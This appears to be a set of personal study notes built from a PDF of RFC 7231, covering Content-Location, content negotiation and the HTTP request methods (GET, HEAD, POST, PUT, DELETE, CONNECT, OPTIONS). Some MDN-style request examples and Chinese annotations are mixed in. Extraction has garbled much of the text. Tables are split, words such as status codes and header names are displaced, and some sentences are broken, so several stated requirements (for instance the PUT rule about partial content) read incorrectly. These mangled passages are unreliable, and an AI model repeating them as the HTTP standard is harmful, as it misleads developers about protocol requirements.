Fielding & Reschke Standards Track [Page 14]
 RFC 7231 HTTP/1.1 Semantics and Content June 2014 o Otherwise, the payload is unidentified.
For a response message, the following rules are applied in order until a match is found:
 1.
2.
3.
4.
If the request method is GET or HEAD and the response status code is 200 (OK), 204 (No Content), 206 (Partial Content), or 304 (Not Modified), the payload is a representation of the resource
identified by the effective request URI (Section 5.5 of
[RFC7230]).
If the request method is GET or HEAD and the response status code is 203 (Non-Authoritative Information), the payload is a
potentially modified or enhanced representation of the target resource as provided by an intermediary.
If the response has a Content-Location header field and its field-value is a reference to the same URI as the effective request URI, the payload is a representation of the resource identified by the effective request URI.
If the response has a Content-Location header field and its field-value is a reference to a URI different from the effective request URI, then the sender asserts that the payload is a representation of the resource identified by the Content-Location field-value. However, such an assertion cannot be trusted unless it can be verified by other means (not defined by this specification).
Otherwise, the payload is unidentified.
  5.
3.1.4.2. Content-Location
 The "Content-Location" header field references a URI that can be used as an identifier for a specific resource corresponding to the representation in this message's payload. In other words, if one
were to perform a GET request on this URI at the time of this
message's generation, then a 200 (OK) response would contain the same representation that is enclosed as payload in this message.
Content-Location = absolute-URI / partial-URI
The Content-Location value is not a replacement for the effective Request URI (Section 5.5 of [RFC7230]). It is representation metadata. It has the same syntax and semantics as the header field of the same name defined for MIME body parts in Section 4 of [RFC2557]. However, its appearance in an HTTP message has some special implications for HTTP recipients.
Fielding & Reschke Standards Track [Page 15]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
If Content-Location is included in a 2xx (Successful) response
message and its value refers (after conversion to absolute form) to a
URI that is the same as the effective request URI, then the recipient MAY consider the payload to be a current representation of that resource at the time indicated by the message origination date. For
a GET (Section 4.3.1) or HEAD (Section 4.3.2) request, this is the
same as the default semantics when no Content-Location is provided by the server. For a state-changing request like PUT (Section 4.3.4) or POST (Section 4.3.3), it implies that the server's response contains
the new representation of that resource, thereby distinguishing it
         from representations that might only report about the action (e.g., "It worked!"). This allows authoring applications to update their local copies without the need for a subsequent GET request.
If Content-Location is included in a 2xx (Successful) response message and its field-value refers to a URI that differs from the effective request URI, then the origin server claims that the URI is an identifier for a different resource corresponding to the enclosed representation. Such a claim can only be trusted if both identifiers share the same resource owner, which cannot be programmatically determined via HTTP.
o For a response to a GET or HEAD request, this is an indication that the effective request URI refers to a resource that is subject to content negotiation and the Content-Location field-value is a more specific identifier for the selected representation.
o For a 201 (Created) response to a state-changing method, a Content-Location field-value that is identical to the Location field-value indicates that this payload is a current representation of the newly created resource.
o Otherwise, such a Content-Location indicates that this payload is a representation reporting on the requested action's status and that the same report is available (for future access with GET) at the given URI. For example, a purchase transaction made via a POST request might include a receipt document as the payload of the 200 (OK) response; the Content-Location field-value provides an identifier for retrieving a copy of that same receipt in the
future.
A user agent that sends Content-Location in a request message is stating that its value refers to where the user agent originally obtained the content of the enclosed representation (prior to any modifications made by that user agent). In other words, the user agent is providing a back link to the source of the original representation.
Fielding & Reschke Standards Track [Page 16]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
An origin server that receives a Content-Location field in a request message MUST treat the information as transitory request context rather than as metadata to be saved verbatim as part of the representation. An origin server MAY use that context to guide in processing the request or to save it for other uses, such as within source links or versioning metadata. However, an origin server MUST NOT use such context information to alter the request semantics.
For example, if a client makes a PUT request on a negotiated resource and the origin server accepts that PUT (without redirection), then
the new state of that resource is expected to be consistent with the one representation supplied in that PUT; the Content-Location cannot be used as a form of reverse content selection identifier to update only one of the negotiated representations. If the user agent had wanted the latter semantics, it would have applied the PUT directly
to the Content-Location URI.
3.2. Representation Data
The representation data associated with an HTTP message is either provided as the payload body of the message or referred to by the message semantics and the effective request URI. The representation data is in a format and encoding defined by the representation
 metadata header fields.
The data type of the representation data is determined via the header fields Content-Type and Content-Encoding. These define a two-layer, ordered encoding model:
representation-data := Content-Encoding( Content-Type( bits ) )
3.3. Payload Semantics
Some HTTP messages transfer a complete or partial representation as the message "payload". In some cases, a payload might contain only the associated representation's header fields (e.g., responses to HEAD) or only some part(s) of the representation data (e.g., the 206 (Partial Content) status code).
The purpose of a payload in a request is defined by the method semantics. For example, a representation in the payload of a PUT request (Section 4.3.4) represents the desired state of the target resource if the request is successfully applied, whereas a representation in the payload of a POST request (Section 4.3.3) represents information to be processed by the target resource.
Fielding & Reschke Standards Track [Page 17]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
In a response, the payload's purpose is defined by both the request
   method and the response status code. For example, the payload of a 200 (OK) response to GET (Section 4.3.1) represents the current state
of the target resource, as observed at the time of the message origination date (Section 7.1.1.2), whereas the payload of the same status code in a response to POST might represent either the processing result or the new state of the target resource after
applying the processing. Response messages with an error status code usually contain a payload that represents the error condition, such
that it describes the error state and what next steps are suggested for resolving it.
Header fields that specifically describe the payload, rather than the associated representation, are referred to as "payload header fields". Payload header fields are defined in other parts of this specification, due to their impact on message parsing.
+-------------------+----------------------------+
| Header Field Name | Defined in... | +-------------------+----------------------------+
| Content-Length | Section 3.3.2 of [RFC7230] | | Content-Range | Section 4.2 of [RFC7233] | | Trailer | Section 4.4 of [RFC7230] |
| Transfer-Encoding | Section 3.3.1 of [RFC7230] | +-------------------+----------------------------+
3.4. Content Negotiation
When responses convey payload information, whether indicating a success or an error, the origin server often has different ways of representing that information; for example, in different formats, languages, or encodings. Likewise, different users or user agents might have differing capabilities, characteristics, or preferences
that could influence which representation, among those available, would be best to deliver. For this reason, HTTP provides mechanisms for content negotiation.
         This specification defines two patterns of content negotiation that
can be made visible within the protocol: "proactive", where the
server selects the representation based upon the user agent's stated preferences, and "reactive" negotiation, where the server provides a list of representations for the user agent to choose from. Other patterns of content negotiation include "conditional content", where the representation consists of multiple parts that are selectively rendered based on user agent parameters, "active content", where the representation contains a script that makes additional (more
specific) requests based on the user agent characteristics, and "Transparent Content Negotiation" ([RFC2295]), where content
Fielding & Reschke Standards Track [Page 18]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
selection is performed by an intermediary. These patterns are not mutually exclusive, and each has trade-offs in applicability and practicality.
Note that, in all cases, HTTP is not aware of the resource semantics. The consistency with which an origin server responds to requests, over time and over the varying dimensions of content negotiation, and thus the "sameness" of a resource's observed representations over time, is determined entirely by whatever entity or algorithm selects
or generates those responses. HTTP pays no attention to the man behind the curtain.
3.4.1. Proactive Negotiation
   When content negotiation preferences are sent by the user agent in a request to encourage an algorithm located at the server to select the preferred representation, it is called proactive negotiation (a.k.a., server-driven negotiation). Selection is based on the available representations for a response (the dimensions over which it might vary, such as language, content-coding, etc.) compared to various information supplied in the request, including both the explicit negotiation fields of Section 5.3 and implicit characteristics, such
as the client's network address or parts of the User-Agent field.
Proactive negotiation is advantageous when the algorithm for selecting from among the available representations is difficult to describe to a user agent, or when the server desires to send its "best guess" to the user agent along with the first response (hoping to avoid the round trip delay of a subsequent request if the "best guess" is good enough for the user). In order to improve the server's guess, a user agent MAY send request header fields that describe its preferences.
Proactive negotiation has serious disadvantages:
o It is impossible for the server to accurately determine what might be "best" for any given user, since that would require complete knowledge of both the capabilities of the user agent and the intended use for the response (e.g., does the user want to view it on screen or print it on paper?);
o Having the user agent describe its capabilities in every request can be both very inefficient (given that only a small percentage of responses have multiple representations) and a potential risk to the user's privacy;
o It complicates the implementation of an origin server and the algorithms for generating responses to a request; and,
 Fielding & Reschke Standards Track [Page 19]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 o It limits the reusability of responses for shared caching.
A user agent cannot rely on proactive negotiation preferences being consistently honored, since the origin server might not implement proactive negotiation for the requested resource or might decide that sending a response that doesn't conform to the user agent's preferences is better than sending a 406 (Not Acceptable) response.
A Vary header field (Section 7.1.4) is often sent in a response subject to proactive negotiation to indicate what parts of the request information were used in the selection algorithm.
3.4.2. Reactive Negotiation
With reactive negotiation (a.k.a., agent-driven negotiation), selection of the best response representation (regardless of the status code) is performed by the user agent after receiving an
initial response from the origin server that contains a list of resources for alternative representations. If the user agent is not satisfied by the initial response representation, it can perform a GET request on one or more of the alternative resources, selected based on metadata included in the list, to obtain a different form of representation for that response. Selection of alternatives might be performed automatically by the user agent or manually by the user selecting from a generated (possibly hypertext) menu.
Note that the above refers to representations of the response, in
   general, not representations of the resource. The alternative representations are only considered representations of the target resource if the response in which those alternatives are provided has the semantics of being a representation of the target resource (e.g., a 200 (OK) response to a GET request) or has the semantics of providing links to alternative representations for the target
resource (e.g., a 300 (Multiple Choices) response to a GET request).
A server might choose not to send an initial representation, other than the list of alternatives, and thereby indicate that reactive negotiation by the user agent is preferred. For example, the alternatives listed in responses with the 300 (Multiple Choices) and 406 (Not Acceptable) status codes include information about the available representations so that the user or user agent can react by making a selection.
Reactive negotiation is advantageous when the response would vary over commonly used dimensions (such as type, language, or encoding), when the origin server is unable to determine a user agent's
capabilities from examining the request, and generally when public caches are used to distribute server load and reduce network usage.
Fielding & Reschke Standards Track [Page 20]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
Reactive negotiation suffers from the disadvantages of transmitting a list of alternatives to the user agent, which degrades user-perceived latency if transmitted in the header section, and needing a second request to obtain an alternate representation. Furthermore, this specification does not define a mechanism for supporting automatic
 ▪


## selection, though it does not prevent such a mechanism from being developed as an extension.
4. HTTP request methods Request Methods 4.1. Overview
The request method token is the primary source of request semantics;
it indicates the purpose for which the client has made this request
what is expected by the client as a successful result.
The request method's semantics might be further specialized by the
semantics of some header fields when present in a request (Section 5)
if those additional semantics do not conflict with the method. For example, a client can send conditional request header
fields (Section 5.2) to make the requested action conditional on the current state of the target resource ([RFC7232]).
method = token
HTTP was originally designed to be usable as an interface to
distributed object systems. The request method was envisioned as
applying semantics to a target resource in much the same way as
invoking a defined method on an identified object would apply
semantics. The method token is case-sensitive because it might be
used as a gateway to object-based systems with case-
       ▪


## sensitive method names.
Unlike distributed objects, the standardized request methods in HTTP are not resource-specific
uniform interfaces provide better visibility and reuse in network-based systems [REST].
Once defined, a standardized method ought to have the
same semantics when applied to any resource, though each resource determines for itself whether those semantics are implemented or allowed.
standardized methods that are commonly used in HTTP:
   +---------
+-----------------------------------------------
--+-------+
   | Method  | Description
| Sec.  |
   +---------
+-----------------------------------------------
--+-------+
   | GET     | Transfer a current representation
of the target | 4.3.1 |
| | resource. ||
   | HEAD    | Same as GET, but only transfer
the status line  | 4.3.2 |
| | and header section. ||
   | POST    | Perform resource-specific
processing on the     | 4.3.3 |
| | request payload. ||
   ▪


##    | PUT     | Replace all current
representations of the      | 4.3.4 |
| | target resource with the request payload. ||
   | DELETE  | Remove all current
representations of the       | 4.3.5 |
| | target resource. ||
   | CONNECT | Establish a tunnel to the server
identified by  | 4.3.6 |
| | the target resource. ||
   | OPTIONS | Describe the communication
options for the      | 4.3.7 |
| | target resource. ||
   | TRACE   | Perform a message loop-back test
along the path | 4.3.8 |
| | to the target resource. ||
   +---------
+-----------------------------------------------
--+-------+
All general-purpose servers MUST support the methods GET and HEAD.
All other methods are OPTIONAL.
Additional methods, outside the scope of this specification,
have been standardized for use in HTTP. All such methods ought to be registered within the "Hypertext Transfer Protocol (HTTP) Method Registry" maintained by IANA, as defined in Section 8.1.
The set of methods allowed by a target resource can be listed 1,437

▪
in an Allow header field (Section 7.4.1).
the set of allowed methods can change dynamically.
When a request method unrecognized / not implemented by an origin server, the origin server SHOULD respond with the
501 (Not Implemented) status code.
When a request method is known but not allowed by an
origin server for the target resource, the origin server SHOULD respond with the 405 (Method Not Allowed) status code.
4.2. Common Method Properties 4.2.1. Safe Methods
Request methods are considered "safe" if their defined semantics are essentially read-only;
i.e., the client does not request / expect, any state change on the origin server as a result of applying a safe method to
a target resource.
Likewise, reasonable use of a safe method is not expected
to cause any harm, loss of property, or unusual burden on the origin server.
This definition of safe methods does not prevent an
implementation from including behavior that is potentially harmful, not entirely read-only, or causes side effects while invoking a safe method.
But, as the client did not request that additional behavior, cannot be held accountable for it.
For example, most servers append request information to access log files at the completion of every response,
         ▪


## regardless of the method, and that is considered safe even though the log storage might become full and crash the server.
Likewise, a safe request initiated by selecting an
advertisement on the Web will often have the side effect of charging an advertising account.
the GET, HEAD, OPTIONS, and TRACE methods are defined to be safe.
The purpose of distinguishing between safe and unsafe methods
To allow automated retrieval processes (spiders) and cache
performance optimization (pre-fetching) to work without fear of causing harm.
In addition, it allows a user agent to apply appropriate constraints on the automated use of unsafe methods when
processing potentially untrusted content.
A user agent SHOULD distinguish between safe and unsafe
methods when presenting potential actions to a user, such that the user can be made aware of an unsafe action before it is requested.
A user agent SHOULD distinguish between safe and unsafe methods when presenting potential actions to a user, so the user can be made aware of an unsafe action before it is requested
When a resource is constructed
such parameters within the effective request URI have the
effect of selecting an action, it is the resource owner's responsibility to ensure that the action is consistent with the request method semantics.
         ▪


##  For example, it is common for Web-based content editing
software to use actions within query parameters, such as "page?do=delete".
If the purpose of such a resource is to perform an unsafe
action
  - the resource owner MUST disable or disallow that
action when it is accessed using a safe request
method.
  - Failure to do so will result in unfortunate side effects
when automated processes perform a GET on every URI reference for the sake of link maintenance, pre- fetching, building a search index, etc.
4.2.2. Idempotent 等幂 Methods /ˌaɪdem'pəʊt(ə)nt/
A request method is considered "idempotent" if the intended effect on the server of multiple identical requests with that method is the same as the effect for a single such request.
PUT, DELETE, and safe request methods are idempotent.
Like the definition of safe, the idempotent property only applies to what has been requested by the user;
a server is free to log each request separately, retain a
revision control history, or implement other non-idempotent side effects for each idempotent request.
Idempotent methods are distinguished because the request can be repeated automatically if a communication failure occurs before the client is able to read the server's response.
     ▪


##  For example
a client sends a PUT request and the underlying connection
is closed before any response is received, then the client can establish a new connection and retry the idempotent request.
It knows that repeating the request will have the same intended effect, even if the original request succeeded,
though the response might differ. 4.2.3. Cacheable Methods
Request methods can be defined as "cacheable" to indicate that responses to them are allowed to be stored for future reuse; for specific requirements see [RFC7234].
In general, safe methods that do not depend on a current or authoritative response are defined as cacheable; this specification defines GET, HEAD, and POST as cacheable, although the overwhelming majority of cache implementations only support GET and HEAD.
4.3. Method Definitions 4.3.1. GET
         ▪


##  Syntax
- GET /index.html The GET method
requests transfer of a current selected representation for the target resource.
Requests using GET should only retrieve data. No secure, content will be in the URL.
GET is the primary mechanism of information retrieval and
the focus of performance optimizations.
  - Hence, when people speak of retrieving some identifiable information via HTTP, they are generally referring to making a GET request.
It is tempting to think of
  - resource identifiers as remote file system pathnames
  - representations as a copy of the contents of such files.
  - In fact, that is how many resources are implemented. However, there are no such limitations in practice.
     ▪


##  The HTTP interface for a resource is like a tree of content
objects, a programmatic view on various database records, a gateway to other information systems.
Even when the URI mapping mechanism is tied to a file
system, an origin server might be configured to execute the files with the request as input and send the output as the representation rather than transfer the files directly.
only the origin server needs to know
  - how each of its resource identifiers corresponds to an implementation
  - how each implementation manages to select
  - send a current representation of the target resource in
a response to GET.
A client can alter the semantics of GET to be a "range
request",
  - requesting transfer of only some part(s) of the selected representation, by sending a Range header field in the request ([RFC7233]).
A payload within a GET request message has no defined
semantics;
  - sending a payload body on a GET request might cause some existing implementations to reject the request.
The response to a GET request is cacheable;
  - a cache MAY use it to satisfy subsequent GET and HEAD requests unless otherwise indicated by the Cache-Control header field (Section 5.2 of [RFC7234]).
4.3.2. HEAD
         ▪


##  Syntax
- HEAD /index.html The HEAD method
identical to GET except that the server MUST NOT send a
message body in the response (i.e., the response terminates at the end of the header section).
  - The server SHOULD send the same header fields in response to a HEAD request as for GET request, except the payload header fields MAY be omitted.
  - A response to a HEAD method should not have a body. If so, it must be ignored.
  - Even so, entity headers describing the content of the body, like Content-Length may be included in the response.
  - They don't relate to the body of the HEAD response, which should be empty, but to the body which a similar request using the GET method would have returned as a response.
If the result of a HEAD request shows that a cached resource 1,444

▪
after a GET request is now outdated, the cache is invalidated, even if no GET request has been made.
This method can be used for obtaining metadata about the
selected representation without transferring the representation data
  - often used for testing hypertext links for validity, accessibility, and recent modification.
  - 允许客户端在未获取实际资源的情况下，对资源的首部 进行检查。
  - 在不获取资源的情况下了解资源的情况(比如，判断其类 型);
  - 通过查看响应中的状态码，看看某个对象是否存在;
  - 通过查看首部，测试资源是否被修改了。
A payload within a HEAD request message has no defined
semantics;
  - sending a payload body on a HEAD request might
cause some existing implementations to reject the request.
The response to a HEAD request is cacheable;
  - a cache MAY use it to satisfy subsequent HEAD requests unless otherwise indicated by the Cache- Control header field (Section 5.2 of [RFC7234]).
A HEAD response might also have an effect on previously cached GET responses.
服务器开发者必须确保返回的首部与 GET 请求所返回的首部 完全相同。遵循 HTTP/1.1 规范，就必须实现 HEAD 方法。
4.3.3. POST
             Syntax ▪


##   POST /test The POST method
requests that the target resource process the representation enclosed in the request according to the resource's own
specific semantics.
sends data to the server. The type of the body of the
request is indicated by the Content-Type header. POST is designed to allow a uniform method to cover the
following functions:
  - Providing a block of data, such as the fields entered
into an HTML form, to a data-handling process;
  - Posting a message to a bulletin board, newsgroup,
mailing list, blog, or similar group of articles;
  - Creating a new resource that has yet to be identified by
the origin server
  - Appending data to a resource's existing
representation(s).
  - Annotation of existing resources
  - Adding a new user through a signup modal;
  - Extending a database through an append operation.
The difference between PUT and POST
PUT is idempotent: calling it once or several times
successively has the same effect (no side effect),
successive identical POST may have additional effects, like passing an order several times.
Responses to POST:
An origin server indicates response semantics by choosing an appropriate status code depending on the result of processing
         ▪


## the POST request;
almost all of the status codes might be received in a
response to POST
  - (the exceptions being 206 (Partial Content), 304 (Not
Modified), and 416 (Range Not Satisfiable)).
If one or more resources has been created on the origin
server as a result of successfully processing a POST request,
  - the origin server SHOULD send a 201 (Created) containing
  - a header field that provides an identifier for the primary resource created
  - and a representation describes the status of the request while referring to the new resource(s).
If the result of processing a POST would be equivalent to a
representation of an existing resource
  - an origin server MAY redirect the user agent to that resource by sending a with the existing resource's identifier in the   field.
  - This has the benefits of providing the user agent a resource identifier and transferring the representation via a method more amenable to shared caching, though at the cost of an extra request if the user agent does not already have the representation cached.
Responses to POST requests are only cacheable when they include explicit freshness information.
However, POST caching is not widely implemented.
For cases where an origin server wishes the client to be able
to cache the result of a POST in a way that can be reused by a later GET,
  - the origin server MAY send a 200 (OK) response 1,448
    response
 Location
    303 (See Other) response
Location

▪
containing the result and a Content-Location header field that has the same value as the POST's effective request URI (Section 3.1.4.2).
A POST request is typically sent via an HTML form and results in a change on the server.
In this case, the content type is selected by putting the
adequate string in the attribute of the
element or the     attribute of the or
elements:
: the keys and
values are encoded in key-value tuples separated by '&', with a '=' between the key and the value.
  - Non-alphanumeric characters in both keys and values are percent encoded:
  - this is the reason why this type is not suitable to use with binary data (use multipart/form-data instead)
multipart/form-data: each value is sent as a block of
data ("body part"), with a user agent-defined delimiter ("boundary") separating each part. The keys are given in the Content-Disposition header of each part.
text/plain
When the POST request is sent via method other than an HTML
form — like XMLHttpRequest — the body can take any type.
Example
A simple form using the default application/x-www-form- content type:
      <button>
enctype
formenctype
<form>
 <input>
   application/x-www-form-urlencoded
      urlencoded
 POST /test HTTP/1.1
Host: foo.example  Content-Type: application/x-www-form-urlencoded
Content-Length: 27
field1=value1&field2=value2
A form using the   content type:
multipart/form-data
POST /test HTTP/1.1
Host: foo.example
Content-Type: multipart/form-
data;boundary="boundary"
--boundary
Content-Disposition: form-data; name="field1"
value1
--boundary
Content-Disposition: form-data; name="field2";
filename="example.txt"
value2
--boundary--
 4.3.4. PUT
 ▪


## Syntax
    PUT /new.html HTTP/1.1
URI = Universal Resource Identifier URL = Universal Resource Locator
The PUT method
requests the state of the target resource be created or
replaced with the state defined by the representation enclosed in the request message payload.
   Request
  PUT /new.html HTTP/1.1
Host: example.com
Content-type: text/html
Content-length: 16
<p>New File</p>
Responses
A successful PUT of a given representation would suggest
that a subsequent GET on that same target resource will result in an equivalent representation being sent in a 200 (OK) response.
  - However, there is no guarantee that such a state change will be observable, since the target resource might be acted upon by other user agents in parallel, or might be subject to dynamic processing by the origin server, before any subsequent GET is received.
  - A successful response only implies that the user agent's intent was achieved at the time of its processing by the origin server.
   ▪


## If the target resource does not have a current representation and the PUT successfully creates one
the origin server MUST inform the user agent by sending a 201 (Created) response.
If the target resource does have a current representation and that representation is successfully modified in accordance with the state of the enclosed representation
the origin server MUST send either a 200 (OK) or a 204 (No Content) response to indicate successful completion of the
request.
An origin server SHOULD ignore unrecognized header fields received in a PUT request (i.e., do not save them as part of the resource state).
An origin server SHOULD verify that the PUT representation is consistent with any 参数 constraints the server has for the target resource that cannot or will not be changed by the PUT.
This is particularly important when the origin server uses
internal configuration information related to the URI in order to set the values for representation metadata on GET responses.
When a PUT representation is inconsistent 不一致的 with the target resource
   HTTP/1.1 201 Created
Content-Location: /new.html
    HTTP/1.1 204 No Content
Content-Location: /existing.html
 ▪


##   - For example
  - if the target resource is configured to always have
a Content-Type of "text/html"
  - and the representation being PUT has a Content-
Type of "image/jpeg"
  - the origin server ought to do one of:
the origin server SHOULD
  - make them consistent, by transforming the representation or changing the resource configuration
  - transform the PUT representation to a format consistent with that of the resource before saving it as the new resource state;
  - reconfigure the target resource to reflect the new media type;
  - or respond with an appropriate error message.
  - containing sufficient information to explain why
the representation is unsuitable.
  - The or 415 (Unsupported Media
status codes are suggested, with the latter being specific to constraints on Content-Type values.
  - reject the request with a 415 (Unsupported Media Type) response indicating that the target resource is limited to "text/html", perhaps including a link to a different resource that would be a suitable target for the new representation.
HTTP does not define exactly how a PUT method affects the
state of an origin server beyond what can be expressed by the intent of the user agent request and the semantics of the origin server response.
It does not define what a resource might be, in any sense of
   Type)
409 (Conflict)
   ▪


## that word, beyond the interface provided via HTTP.
It does not define how resource state is "stored", nor how
such storage might change as a result of a change in resource state, nor how the origin server translates resource state into representations.
Generally speaking, all implementation details behind the resource interface are intentionally hidden by the server.
An origin server MUST NOT send a validator header field, such as an ETag or Last-Modified field, in a successful response to PUT
unless the request's representation data was saved without
any transformation applied to the body (i.e., the resource's new representation data is identical to the representation data received in the PUT request) and the validator field value reflects the new representation.
This requirement allows a user agent to know when the representation body it has in memory remains current as a result of the PUT, thus not in need of being retrieved again from the origin server, and that the new validator(s) received in the response can be used for future conditional requests in order to prevent accidental overwrites.
PUT is idempotent: calling it once or several times successively has the same effect (that is no side effect) POST和PUT请求最根本的区别是 Request-URI 的含义不同。
POST请求里的URI指示一个能处理请求实体的资源:资源可 能是一段程序，如jsp里的servlet)，一个数据接收过程，一 个网关(gateway，译注:网关和代理服务器的区别是:网关 可以进行协议转换，而代理服务器不能，只是起代理的作用，
         ▪


##   比如缓存服务器其实就是一个代理服务器)，或者一个单独接
  收注释的实体。
PUT方法请求里有一个实体:用户代理知道URI意指什么，并 且服务器不能把此请求应用于其他URI指定的资源。如果服务 器期望请求被应用于一个不同的URI，那么它必须发送301 (永久移动了)响应;用户代理可以自己决定是否重定向请 求。
The fundamental difference between the POST and PUT methods: the different intent for the enclosed representation.
The target resource in a POST request is intended to handle the enclosed representation according to the resource's
own semantics,
the enclosed representation in a PUT request is replacing
the state of the target resource.
Hence, the intent of PUT is idempotent and visible to
intermediaries, even though the exact effect is only known by the origin server.
Proper interpretation of a PUT request presumes that the user agent knows which target resource is desired.
A service that selects a proper URI on behalf of the client, after receiving a state-changing request, SHOULD be
implemented using the POST method rather than PUT.
If the origin server will not make the requested PUT state
change to the target resource and instead wishes to have it applied to a different resource, such as when the resource has been moved to a different URI
  - then the origin server MUST send an appropriate 3xx (Redirection) response;
         ▪


##   - the user agent make its own decision regarding whether or not to redirect the request.
A PUT request applied to the target resource can have side effects on other resources.
For example
an article have a URI for identifying "the current version" (a
resource) that is separate from the URIs identifying each particular version (different resources that at one point shared the same state as the current version resource).
A successful PUT request on "the current version" URI
might therefore create a new version resource in addition to changing the state of the target resource, and might also cause links to be added between the related resources.
An origin server that allows PUT on a given target resource MUST send a   response to a PUT request that contains a   header field, since the payload is likely to be partial content that has been mistakenly PUT as a full representation.
Partial content updates are possible by targeting a
separately identified resource with state that overlaps a portion of the larger resource, or by using a different method that has been specifically defined for partial updates (for example, the PATCH method defined in [RFC5789]).
PUT responses are not cacheable.
If a successful PUT request passes through a cache that has
one or more stored responses for the effective request URI, those stored responses will be invalidated.
4.3.5. DELETE
   400 (Bad Request)
Content-Range
   ▪


##   Syntax
DELETE /file.html HTTP/1.1 The DELETE method
requests that the origin server remove the association
between the target resource and its current functionality.   - similar to the rm command in UNIX: a deletion
operation on the URI mapping of the origin server rather than an expectation that the previously associated information be deleted.
   ▪


##  If the target resource has one or more current
representations, they might or might not be destroyed by the origin server, and the associated storage might or might not be reclaimed,
  - depending entirely on the nature of the resource and its implementation by the origin server (which are beyond the scope of this specification).
Likewise, other implementation aspects of a resource might need to be deactivated or archived as a result of a DELETE, such as database or gateway connections.
In general, it is assumed that the origin server will only allow DELETE on resources for which it has a prescribed mechanism for accomplishing the deletion.
Relatively few resources allow the DELETE method -- its primary use is for remote authoring environments, where the user has some direction regarding its effect.
For example,
a resource that was previously created using a PUT request,
or identified via the Location header field after a 201 (Created) response to a POST request, might allow a corresponding DELETE request to undo those actions.
Similarly, custom user agent implementations that
implement an authoring function, such as revision control clients using HTTP for remote operations, might use DELETE based on an assumption that the server's URI space has been crafted to correspond to a version repository.
Responses
         ▪


## If a DELETE method is successfully applied, the origin server SHOULD send
a 202 (Accepted) status code if the action will likely succeed but has not yet been enacted,
a 204 (No Content) status code if the action has been enacted and no further information is to be supplied,
a 200 (OK) status code if the action has been enacted and the response message includes a representation describing
the status.
        HTTP/1.1 200 OK
Date: Wed, 21 Oct 2015 07:28:00 GMT
<html>
    <body>
       <h1>File deleted.</h1>
    </body>
</html>
 A payload within a DELETE request message has no defined semantics; sending a payload body on a DELETE request might cause some existing implementations to reject the request.
Responses to the DELETE method are not cacheable.
If a DELETE request passes through a cache that has one or
more stored responses for the effective request URI, those stored responses will be invalidated.
4.3.6. CONNECT
     ▪


##  The CONNECT method
requests that the recipient establish a tunnel to the
destination origin server identified by the request-target, starts two-way communications with the requested resource.
  - if successful, thereafter restrict its behavior to blind forwarding of packets, in both directions, until the tunnel is closed.
Tunnels are commonly used to create an end-to-end virtual connection, through one or more proxies, which can then be secured using TLS (Transport Layer Security).
For example, the CONNECT method can be used to access websites that use SSL (HTTPS).
The client asks an HTTP Proxy server to tunnel the TCP connection to the desired destination.
The server then proceeds to make the connection on behalf of the client.
Once the connection has been established by the server,
the Proxy server continues to proxy the TCP stream to and from the client.
       ▪


##  CONNECT is a hop-by-hop method. Syntax
CONNECT www.example.com:443 HTTP/1.1 CONNECT is intended only for use in requests to a proxy.
An origin server that receives a request for itself
MAY respond with a to indicate that a connection is established.
However, most origin servers do not implement CONNECT. A client sending a CONNECT request MUST send the authority
form of request-target;
i.e., the request-target consists of only the host name and
port number of the tunnel destination, separated by a colon. For example,
The recipient proxy can establish a tunnel either by directly connecting to the request-target or, if configured to use another proxy, by forwarding the CONNECT request to the next inbound proxy.
Any 2xx (Successful) response indicates that the sender (and all inbound proxies) will switch to tunnel mode immediately after the blank line that concludes the successful response's header section; data received after that blank line is from the server identified by the request-target.
     CONNECT
 2xx (Successful) status code
      CONNECT server.example.com:80 HTTP/1.1
Host: server.example.com:80
 ▪


## Any response other than a successful response indicates that the tunnel has not yet been formed and that the connection remains governed by HTTP.
A tunnel is closed when a tunnel intermediary detects that either side has closed its connection:
the intermediary MUST attempt to send any outstanding
data that came from the closed side to the other side, close both connections, and then discard any remaining data left undelivered.
Proxy authentication might be used to establish the authority to create a tunnel. For example,
significant risks in establishing a tunnel to arbitrary servers, well- known or reserved destination TCP port that is not for Web traffic.
For example,
a CONNECT to a request-target of "example.com:25" would suggest that the proxy connect to the reserved port for
SMTP traffic;
if allowed, that could trick the proxy into relaying spam email.
Proxies that support CONNECT SHOULD restrict its use to a
limited set of known ports or a configurable whitelist of safe request targets.
  CONNECT server.example.com:80 HTTP/1.1
Host: server.example.com:80
Proxy-Authorization: basic aGVsbG86d29ybGQ=
     ▪


##  A server MUST NOT send any   or
Length header fields in a   to . A client MUST ignore any Content-Length or Transfer-Encoding header fields received in a successful response to CONNECT.
A payload within a CONNECT request message has no defined semantics;
sending a payload body on a CONNECT request might cause some existing implementations to reject the request.
Responses to the CONNECT method are not cacheable. 4.3.7. OPTIONS
Syntax
The OPTIONS method
requests information about the communication options available for the target resource, at either the origin server or
an intervening intermediary.
Transfer-Encoding
 2xx (Successful) response
      OPTIONS /index.html HTTP/1.1
OPTIONS * HTTP/1.1
  1,463
Content- ▪


##  allows a client to determine the options and/or requirements
associated with a resource, or the capabilities of a server, without implying a resource action.
An OPTIONS request with an asterisk ("*")
the request-target applies to the server in general rather
than to a specific resource.
Since a server's communication options typically depend on
the resource, the "*" request is only useful as a "ping" or "no-op" type of method;
it does nothing beyond allowing the client to test the capabilities of the server.
For example, this can be used to test a proxy for HTTP/1.1 conformance (or lack thereof).
If the   request-target is not an asterisk
the   request applies to the options that are available when communicating with the target resource.
A server generating a successful response to OPTIONS SHOULD send any header fields that indicate optional features implemented by the server and applicable to the target resource (e.g., Allow), including potential extensions not defined by this specification.
The response payload, if any, might also describe the
communication options in a machine or human-readable representation.
A standard format for such a representation is not defined by this specification, but might be defined by future
     OPTIONS
 OPTIONS
   ▪


## extensions to HTTP.
A server MUST generate a Content-Length field with a value of "0" if no payload body is sent in the response.
A client MAY send a Max-Forwards header field in an OPTIONS request to target a specific recipient in the request chain.
A proxy MUST NOT generate a Max-Forwards header field while forwarding a request unless that request was received with a Max-Forwards field.
A client that generates an request containing a payload body MUST send a valid header field describing the representation media type.
Although this specification does not define any use for such
a payload, future extensions to HTTP might use the OPTIONS body to make more detailed queries about the target resource.
Responses to the OPTIONS method are not cacheable.
Identifying allowed request methods
To find out which request methods a server supports, one can use   and issue an request:
       OPTIONS
 Content-Type
    curl
The response then contains an methods:
header with the allowed
OPTIONS
 curl -X OPTIONS http://example.org -i
 Allow
 HTTP/1.1 204 No Content
